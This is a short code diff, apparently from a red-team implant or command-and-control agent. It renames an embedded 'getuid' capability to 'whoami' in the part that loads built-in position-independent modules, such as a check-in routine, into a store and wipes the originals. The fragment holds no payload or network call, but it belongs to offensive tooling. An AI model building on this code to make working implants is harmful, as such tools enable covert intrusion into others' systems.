@@ -8,14 +8,14 @@ WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, 
 WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
 
 char __CHECKIN_PICO__[0] __attribute__((section("pico_checkin")));
-char __GETUID_PICO__[0] __attribute__((section("pico_getuid")));
+char __WHOAMI_PICO__[0] __attribute__((section("pico_whoami")));
 
 char * find_checkin_pico() {
     return (char *)&__CHECKIN_PICO__;
 }
 
-char * find_getuid_pico() {
-    return (char *)&__GETUID_PICO__;
+char * find_whoami_pico() {
+    return (char *)&__WHOAMI_PICO__;
 }
 
 void load_builtin_picos(DataVault *vault) {
@@ -23,9 +23,9 @@ void load_builtin_picos(DataVault *vault) {
 	add_to_vault(vault, "_builtin_checkin", checkin->value, checkin->length);
 	for (int i = 0; i < checkin->length; i++) { checkin->value[i] = 0; }
 	
-	_EMBEDDED_PICO *getuid = (_EMBEDDED_PICO *) find_getuid_pico();
-	add_to_vault(vault, "_builtin_getuid", getuid->value, getuid->length);
-	for (int i = 0; i < getuid->length; i++) { getuid->value[i] = 0; }
+	_EMBEDDED_PICO *whoami = (_EMBEDDED_PICO *) find_whoami_pico();
+	add_to_vault(vault, "_builtin_whoami", whoami->value, whoami->length);
+	for (int i = 0; i < whoami->length; i++) { whoami->value[i] = 0; }
 }
 
 BOOL resolve_loaded_pico(DataVault *vault, ResolvedPico *pico, char *key) {
